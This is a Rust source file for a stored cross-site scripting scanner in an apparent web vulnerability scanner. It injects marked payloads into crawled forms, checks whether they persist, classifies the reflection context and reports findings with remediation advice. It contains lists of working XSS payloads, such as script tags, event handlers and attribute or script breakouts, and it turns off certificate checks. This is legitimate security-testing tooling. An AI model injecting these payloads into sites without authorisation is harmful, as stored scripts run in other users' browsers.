#![allow(dead_code)]

use crate::core::scanners::crawl_integration::{CrawlTargetExtractor, ParamType, ScanTarget};
use crate::core::crawler::engine::CrawlResults;
use crate::core::scanners::{Scanner, ScannerType};
use crate::shared::config::JackSparrowConfig;
use crate::shared::context::ScanContext;
use crate::shared::error::JackSparrowError;
use crate::shared::types::{Confidence, Evidence, Finding, Severity, VulnerabilityType};
use async_trait::async_trait;
use reqwest::Client;
use std::time::Duration;
use uuid::Uuid;

/// Payload context where the reflection was found.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PayloadContext {
    /// Reflected in HTML body.
    HtmlBody,
    /// Reflected inside an HTML attribute (e.g., value="...").
    HtmlAttribute(String),
    /// Reflected inside a script tag.
    ScriptTag,
    /// Reflected in a comment.
    HtmlComment,
    /// Reflected in a URL parameter.
    UrlParameter,
    /// Reflected in a meta tag.
    MetaTag,
    /// Reflected in a style tag.
    StyleTag,
    /// Unknown context.
    Unknown,
}

/// Result of testing a single input point.
#[derive(Debug, Clone)]
pub struct InputTestResult {
    /// The input point tested.
    pub target: ScanTarget,
    /// Parameter name tested.
    pub param_name: String,
    /// Payload that was reflected.
    pub payload: String,
    /// Where the payload was reflected.
    pub reflection_url: String,
    /// Context of the reflection.
    pub context: PayloadContext,
    /// Whether the reflection persists across requests.
    pub persistent: bool,
    /// Number of verification attempts.
    pub verification_count: u32,
}

/// Stored XSS scanner that tests for persistent cross-site scripting.
pub struct StoredXssScanner {
    /// HTTP client for requests.
    client: Client,
    /// Payloads organized by context.
    payloads: PayloadSet,
    /// Maximum verification attempts.
    max_verifications: u32,
    /// Delay between requests (ms).
    request_delay: u64,
}

/// Set of payloads for different contexts.
struct PayloadSet {
    html: Vec<String>,
    attribute: Vec<String>,
    script: Vec<String>,
    comment: Vec<String>,
}

impl PayloadSet {
    fn new() -> Self {
        Self {
            html: vec![
                "<script>alert('xss')</script>".to_string(),
                "<img src=x onerror=alert('xss')>".to_string(),
                "<svg onload=alert('xss')>".to_string(),
                "<body onload=alert('xss')>".to_string(),
                "<iframe src=\"javascript:alert('xss')\">".to_string(),
                "<input onfocus=alert('xss') autofocus>".to_string(),
                "<details open ontoggle=alert('xss')>".to_string(),
                "<math><mtext><table><mglyph><style><img src=x onerror=alert('xss')>".to_string(),
            ],
            attribute: vec![
                "\" onfocus=alert('xss') autofocus=\"".to_string(),
                "' onfocus=alert('xss') autofocus='".to_string(),
                "\" onmouseover=alert('xss')\"".to_string(),
                "' onmouseover=alert('xss')'".to_string(),
                "\" onclick=alert('xss')\"".to_string(),
                "' onclick=alert('xss')'".to_string(),
                "\"><script>alert('xss')</script>".to_string(),
                "'><script>alert('xss')</script>".to_string(),
            ],
            script: vec![
                "';alert('xss');//".to_string(),
                "\";alert('xss');//".to_string(),
                "</script><script>alert('xss')</script>".to_string(),
                "\\'-alert('xss')-'".to_string(),
                "\\\"-alert('xss')-\\\"".to_string(),
                "';document.write('xss');//".to_string(),
                "';eval('alert(1)');//".to_string(),
            ],
            comment: vec![
                "--><script>alert('xss')</script><!--".to_string(),
                "--><img src=x onerror=alert('xss')><!--".to_string(),
                "--><svg onload=alert('xss')><!--".to_string(),
            ],
        }
    }
}

impl StoredXssScanner {
    pub fn new(config: &JackSparrowConfig) -> Self {
        let timeout = Duration::from_secs(config.general.timeout_secs);
        let client = Client::builder()
            .timeout(timeout)
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        Self {
            client,
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 500,
        }
    }

    /// Test a single input point for stored XSS.
    async fn test_input_point(
        &self,
        target: &ScanTarget,
        param: &str,
        param_type: &ParamType,
        context: &ScanContext,
    ) -> Result<Option<InputTestResult>, JackSparrowError> {
        let payloads = self.get_payloads_for_type(param_type);

        for payload in payloads {
            // Generate unique marker for this payload
            let marker = format!("WS_{}", Uuid::new_v4().as_simple().to_string()[..8].to_string());
            let test_payload = format!("{}{}", marker, payload);

            // Inject payload
            let inject_result = self
                .inject_payload(target, param, &test_payload, param_type, context)
                .await?;

            if !inject_result {
                continue;
            }

            // Wait for storage
            tokio::time::sleep(Duration::from_millis(self.request_delay)).await;

            // Check for reflection in other pages
            if let Some(reflection) = self
                .check_reflection(target, &marker, context)
                .await?
            {
                // Verify persistence
                let persistent = self
                    .verify_persistence(target, &marker, context)
                    .await?;

                let context = self.detect_reflection_context(&reflection, &marker);

                return Ok(Some(InputTestResult {
                    target: target.clone(),
                    param_name: param.to_string(),
                    payload: test_payload,
                    reflection_url: reflection,
                    context,
                    persistent,
                    verification_count: if persistent { self.max_verifications } else { 1 },
                }));
            }
        }

        Ok(None)
    }

    /// Get payloads based on parameter type.
    fn get_payloads_for_type(&self, param_type: &ParamType) -> &[String] {
        match param_type {
            ParamType::Query | ParamType::Body => &self.payloads.html,
            ParamType::Hidden => &self.payloads.html,
            ParamType::Path => &self.payloads.html,
        }
    }

    /// Inject a payload into the target.
    async fn inject_payload(
        &self,
        target: &ScanTarget,
        param: &str,
        payload: &str,
        _param_type: &ParamType,
        context: &ScanContext,
    ) -> Result<bool, JackSparrowError> {
        let url = target.url.as_str();

        let response = match target.method {
            crate::core::crawler::parser::Method::Get => {
                let mut url = reqwest::Url::parse(url).map_err(|e| {
                    JackSparrowError::ToolExecutionFailed {
                        tool: "stored_xss".to_string(),
                        message: e.to_string(),
                    }
                })?;

                // Set the parameter
                url.query_pairs_mut().append_pair(param, payload);

                let mut req = self.client.get(url.as_str());
                for (k, v) in &context.headers {
                    req = req.header(k.as_str(), v.as_str());
                }
                if let Some(ref cookies) = context.cookies {
                    req = req.header("Cookie", cookies.as_str());
                }
                req.send().await
            }
            _ => {
                let mut params: Vec<(String, String)> = Vec::new();
                for p in &target.params {
                    if p.name == param {
                        params.push((p.name.clone(), payload.to_string()));
                    } else if let Some(ref v) = p.value {
                        params.push((p.name.clone(), v.clone()));
                    }
                }

                let mut req = self.client.post(url).form(&params);
                for (k, v) in &context.headers {
                    req = req.header(k.as_str(), v.as_str());
                }
                if let Some(ref cookies) = context.cookies {
                    req = req.header("Cookie", cookies.as_str());
                }
                req.send().await
            }
        };

        match response {
            Ok(resp) => Ok(resp.status().is_success()),
            Err(_) => Ok(false),
        }
    }

    /// Check if the marker appears in any page.
    async fn check_reflection(
        &self,
        target: &ScanTarget,
        marker: &str,
        context: &ScanContext,
    ) -> Result<Option<String>, JackSparrowError> {
        // Check the source page first
        if let Some(source) = &target.source_url {
            if self
                .check_page_for_marker(source, marker, context)
                .await?
                .is_some()
            {
                return Ok(Some(source.to_string()));
            }
        }

        // Check the target page
        if let Some(_) = self
            .check_page_for_marker(target.url.as_str(), marker, context)
            .await?
        {
            return Ok(Some(target.url.to_string()));
        }

        Ok(None)
    }

    /// Check a single page for the marker.
    async fn check_page_for_marker(
        &self,
        url: &str,
        marker: &str,
        context: &ScanContext,
    ) -> Result<Option<String>, JackSparrowError> {
        let mut req = self.client.get(url);
        for (k, v) in &context.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        if let Some(ref cookies) = context.cookies {
            req = req.header("Cookie", cookies.as_str());
        }

        let response = req.send().await.map_err(|e| {
            JackSparrowError::ToolExecutionFailed {
                tool: "stored_xss".to_string(),
                message: e.to_string(),
            }
        })?;

        let body = response.text().await.map_err(|e| {
            JackSparrowError::ToolExecutionFailed {
                tool: "stored_xss".to_string(),
                message: e.to_string(),
            }
        })?;

        if body.contains(marker) {
            Ok(Some(body))
        } else {
            Ok(None)
        }
    }

    /// Verify that the payload persists across multiple requests.
    async fn verify_persistence(
        &self,
        target: &ScanTarget,
        marker: &str,
        context: &ScanContext,
    ) -> Result<bool, JackSparrowError> {
        let mut persistent = true;

        for _ in 0..self.max_verifications {
            tokio::time::sleep(Duration::from_millis(self.request_delay)).await;

            if let Some(_) = self
                .check_reflection(target, marker, context)
                .await?
            {
                continue;
            } else {
                persistent = false;
                break;
            }
        }

        Ok(persistent)
    }

    /// Detect the context where the payload was reflected.
    fn detect_reflection_context(&self, body: &str, marker: &str) -> PayloadContext {
        if let Some(pos) = body.find(marker) {
            let before = &body[..pos];
            let after = &body[pos + marker.len()..];

            // Check if inside a script tag
            let last_script_open = before.rfind("<script");
            let last_script_close = before.rfind("</script>");
            if let Some(open) = last_script_open {
                if last_script_close.map_or(true, |c| c < open) {
                    return PayloadContext::ScriptTag;
                }
            }

            // Check if inside an attribute
            let last_quotes_before = before.rfind('"');
            let last_quotes_after = after.find('"');
            if last_quotes_before.is_some() && last_quotes_after.is_some() {
                // Find the attribute name
                let attr_start = before.rfind('=').unwrap_or(0);
                let attr_name = &before[attr_start.saturating_sub(20)..attr_start]
                    .trim_start_matches(|c: char| c.is_alphanumeric() || c == '-' || c == '_');
                if !attr_name.is_empty() {
                    return PayloadContext::HtmlAttribute(attr_name.to_string());
                }
                return PayloadContext::HtmlAttribute("unknown".to_string());
            }

            // Check if inside a comment
            if before.contains("<!--") && after.contains("-->") {
                return PayloadContext::HtmlComment;
            }

            // Check if inside a style tag
            let last_style_open = before.rfind("<style");
            let last_style_close = before.rfind("</style>");
            if let Some(open) = last_style_open {
                if last_style_close.map_or(true, |c| c < open) {
                    return PayloadContext::StyleTag;
                }
            }

            // Check if inside a meta tag
            if before.contains("<meta") || after.contains("</meta>") {
                return PayloadContext::MetaTag;
            }

            // Default to HTML body
            return PayloadContext::HtmlBody;
        }

        PayloadContext::Unknown
    }
}

#[async_trait]
impl Scanner for StoredXssScanner {
    fn scanner_type(&self) -> ScannerType {
        ScannerType::Xss
    }

    async fn scan(
        &self,
        target: &str,
        config: &JackSparrowConfig,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, JackSparrowError> {
        // This is the basic scanner interface - for full stored XSS testing,
        // use scan_with_crawl() which takes CrawlResults
        let _ = (target, config, context);
        Ok(Vec::new())
    }
}

impl StoredXssScanner {
    /// Run stored XSS scan using crawl results.
    pub async fn scan_with_crawl(
        &self,
        crawl_results: &CrawlResults,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, JackSparrowError> {
        let targets = CrawlTargetExtractor::extract_targets(crawl_results);
        let mut findings = Vec::new();

        // Filter targets that have submittable forms or parameters
        let testable_targets: Vec<&ScanTarget> = targets
            .iter()
            .filter(|t| {
                !t.params.is_empty()
                    && (t.target_type == crate::core::scanners::crawl_integration::TargetType::Form
                        || t.target_type
                            == crate::core::scanners::crawl_integration::TargetType::UrlWithParams)
            })
            .collect();

        for target in testable_targets {
            for param in &target.params {
                // Skip hidden params for now (they're less likely to be stored)
                if param.is_hidden {
                    continue;
                }

                let result = self
                    .test_input_point(target, &param.name, &param.param_type, context)
                    .await?;

                if let Some(test_result) = result {
                    let finding = self.create_finding(&test_result, crawl_results.target.as_str());
                    findings.push(finding);
                }
            }
        }

        Ok(findings)
    }

    /// Create a Finding from an InputTestResult.
    fn create_finding(&self, result: &InputTestResult, target: &str) -> Finding {
        let severity = if result.persistent {
            Severity::Critical
        } else {
            Severity::High
        };

        let confidence = if result.persistent {
            Confidence::Confirmed
        } else {
            Confidence::Likely
        };

        let context_desc = match &result.context {
            PayloadContext::HtmlBody => "HTML body".to_string(),
            PayloadContext::HtmlAttribute(attr) => format!("HTML attribute: {}", attr),
            PayloadContext::ScriptTag => "JavaScript context".to_string(),
            PayloadContext::HtmlComment => "HTML comment".to_string(),
            PayloadContext::UrlParameter => "URL parameter".to_string(),
            PayloadContext::MetaTag => "Meta tag".to_string(),
            PayloadContext::StyleTag => "CSS context".to_string(),
            PayloadContext::Unknown => "Unknown context".to_string(),
        };

        let persistence_desc = if result.persistent {
            format!(
                "Payload persists across {} verification attempts",
                result.verification_count
            )
        } else {
            "Payload reflected but not confirmed persistent".to_string()
        };

        let mut finding = Finding::new(
            VulnerabilityType::XssStored,
            severity,
            confidence,
            format!("Stored XSS in parameter: {}", result.param_name),
            target.to_string(),
            "webscanner-stored-xss".to_string(),
        );

        finding.parameter = Some(result.param_name.clone());
        finding.evidence = Evidence {
            request: Some(format!(
                "POST {} [{}={}]",
                result.target.url, result.param_name, result.payload
            )),
            response: Some(format!(
                "Payload reflected in {} at {}",
                context_desc, result.reflection_url
            )),
            payload: Some(result.payload.clone()),
            pattern: Some(result.payload.clone()),
            context: Some(format!(
                "{}. {}",
                context_desc, persistence_desc
            )),
        };
        finding.description = format!(
            "A stored XSS vulnerability was found in the '{}' parameter. \
             The payload was reflected in the {} context{}.\n\n\
             {}.\n\n\
             This vulnerability allows an attacker to inject malicious scripts \
             that will be executed when other users view the affected page.",
            result.param_name,
            context_desc,
            if result.persistent {
                " and persisted across multiple requests"
            } else {
                ""
            },
            persistence_desc,
        );
        finding.cwe_id = Some("CWE-79".to_string());
        finding.cvss_score = if result.persistent { Some(9.1) } else { Some(6.1) };
        finding.remediation = format!(
            "1. Validate and sanitize all user input\n\
             2. Encode output data appropriately\n\
             3. Use Content-Security-Policy headers\n\
             4. Implement HTTPOnly flags on cookies\n\
             5. Use parameterized queries where applicable\n\
             6. Consider using a template engine with auto-escaping"
        );
        finding.references = vec![
            "https://owasp.org/www-community/attacks/xss/".to_string(),
            "https://cwe.mitre.org/data/definitions/79.html".to_string(),
            "https://portswigger.net/web-security/cross-site-scripting/stored".to_string(),
        ];

        finding
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::scanners::crawl_integration::{ParamType, ScanParam, ScanTarget, TargetType};
    
    use crate::core::crawler::parser::Method;
    use url::Url;

    fn make_test_target(url: &str, params: Vec<ScanParam>) -> ScanTarget {
        ScanTarget {
            url: Url::parse(url).unwrap(),
            method: Method::Post,
            params,
            source_url: None,
            target_type: TargetType::Form,
            depth: 1,
        }
    }

    fn make_test_param(name: &str) -> ScanParam {
        ScanParam {
            name: name.to_string(),
            param_type: ParamType::Body,
            value: None,
            is_hidden: false,
        }
    }

    #[test]
    fn payload_set_has_all_contexts() {
        let payloads = PayloadSet::new();
        assert!(!payloads.html.is_empty());
        assert!(!payloads.attribute.is_empty());
        assert!(!payloads.script.is_empty());
        assert!(!payloads.comment.is_empty());
    }

    #[test]
    fn detect_html_body_context() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let body = "<html><body>WS_12345678</body></html>";
        let marker = "WS_12345678";
        let context = scanner.detect_reflection_context(body, marker);
        assert_eq!(context, PayloadContext::HtmlBody);
    }

    #[test]
    fn detect_script_tag_context() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let body = "<html><script>var x = 'WS_12345678';</script></html>";
        let marker = "WS_12345678";
        let context = scanner.detect_reflection_context(body, marker);
        assert_eq!(context, PayloadContext::ScriptTag);
    }

    #[test]
    fn detect_attribute_context() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let body = r#"<input value="WS_12345678">"#;
        let marker = "WS_12345678";
        let context = scanner.detect_reflection_context(body, marker);
        assert!(matches!(context, PayloadContext::HtmlAttribute(_)));
    }

    #[test]
    fn detect_comment_context() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let body = "<html><!-- WS_12345678 --></html>";
        let marker = "WS_12345678";
        let context = scanner.detect_reflection_context(body, marker);
        assert_eq!(context, PayloadContext::HtmlComment);
    }

    #[test]
    fn get_payloads_returns_correct_type() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let html_payloads = scanner.get_payloads_for_type(&ParamType::Body);
        assert_eq!(html_payloads.len(), scanner.payloads.html.len());

        let query_payloads = scanner.get_payloads_for_type(&ParamType::Query);
        assert_eq!(query_payloads.len(), scanner.payloads.html.len());
    }

    #[test]
    fn create_finding_has_correct_fields() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let result = InputTestResult {
            target: make_test_target(
                "http://example.com/comment",
                vec![make_test_param("comment")],
            ),
            param_name: "comment".to_string(),
            payload: "<script>alert('xss')</script>".to_string(),
            reflection_url: "http://example.com/view".to_string(),
            context: PayloadContext::HtmlBody,
            persistent: true,
            verification_count: 3,
        };

        let finding = scanner.create_finding(&result, "http://example.com");
        assert_eq!(finding.vulnerability_type, VulnerabilityType::XssStored);
        assert_eq!(finding.severity, Severity::Critical);
        assert_eq!(finding.confidence, Confidence::Confirmed);
        assert!(finding.parameter.is_some());
        assert!(finding.evidence.payload.is_some());
        assert_eq!(finding.cvss_score, Some(9.1));
    }

    #[test]
    fn non_persistent_is_lower_severity() {
        let scanner = StoredXssScanner {
            client: Client::new(),
            payloads: PayloadSet::new(),
            max_verifications: 3,
            request_delay: 0,
        };

        let result = InputTestResult {
            target: make_test_target(
                "http://example.com/search",
                vec![make_test_param("q")],
            ),
            param_name: "q".to_string(),
            payload: "<script>alert('xss')</script>".to_string(),
            reflection_url: "http://example.com/search?q=...".to_string(),
            context: PayloadContext::HtmlBody,
            persistent: false,
            verification_count: 1,
        };

        let finding = scanner.create_finding(&result, "http://example.com");
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(finding.confidence, Confidence::Likely);
        assert_eq!(finding.cvss_score, Some(6.1));
    }
}
